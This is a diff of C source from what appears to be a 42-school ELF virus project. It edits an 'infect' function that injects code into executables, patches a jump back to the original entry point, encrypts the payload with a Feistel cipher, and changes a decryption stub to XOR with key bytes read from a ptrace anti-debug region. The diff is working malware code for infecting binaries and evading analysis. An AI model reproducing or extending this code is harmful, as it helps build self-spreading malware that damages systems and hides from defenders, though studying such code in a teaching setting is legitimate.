@@ -6,7 +6,7 @@
 /*   By: nguiard <marvin@42.fr>                     +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2024/10/31 10:47:01 by nguiard           #+#    #+#             */
-/*   Updated: 2024/11/25 15:31:57 by nguiard          ###   ########.fr       */
+/*   Updated: 2025/01/22 20:28:38 by nguiard          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -14,13 +14,13 @@
 
 static bool		parsing(byte *file, elf_data *data);
 
-#define _START_SIZE 0x10e
+#define _START_SIZE 0x110
 
 void manual_modif(uint8_t *ptrace, uint8_t *ptrace_end, uint8_t *decrypt) {
     while (ptrace < ptrace_end) { // While current_ptrace < end_ptrace
-        // uint32_t key = *(uint32_t *)ptrace;  // Read 4 bytes from _ptrace (key)
+        uint32_t key = *(uint32_t *)ptrace;  // Read 4 bytes from _ptrace (key)
         uint32_t data = *(uint32_t *)decrypt; // Read 4 bytes from decrypt (encrypted data)
-        *(uint32_t *)decrypt = data ^ 0xcacacaca;   // Decrypt using XOR and save the result
+        *(uint32_t *)decrypt = data ^ key;   // Decrypt using XOR and save the result
         ptrace += 4;                         // Advance by 4 bytes in _ptrace
         decrypt += 4;                        // Advance by 4 bytes in decrypt
     }
@@ -159,7 +159,7 @@ bool	infect(profiling *this, const str path) {
 
 	// Write jump to original entry point and jump to decrypt if we aren't the original
 	ft_memcpy(data.file + data.infection_offset_file + this->size - 16, (byte *)&new_jump, 4);
-	ft_memcpy(data.file + data.infection_offset_file + this->size - 247, (byte *)&zero, 4);
+	ft_memcpy(data.file + data.infection_offset_file + this->size - 249, (byte *)&zero, 4);
 
 	uint64_t key = generate_random_key();
 	if (key == 0) {
@@ -177,8 +177,8 @@ bool	infect(profiling *this, const str path) {
 
 	feistel_encrypt(data.file + data.infection_offset_file, this->size - _START_SIZE - 1, key);
 
-	byte *ptrace_start = data.file + data.infection_offset_file + this->size - 190;
-	byte *ptrace_end = data.file + data.infection_offset_file + this->size - 156;
+	byte *ptrace_start = data.file + data.infection_offset_file + this->size - 196;
+	byte *ptrace_end = data.file + data.infection_offset_file + this->size - 162;
 	byte *decrypt_start = data.file + data.infection_offset_file + this->size - 155;
 
 	// // write ptrace_start, ptrace_end, decrypt_start, i want the pointer so 0x... not the value
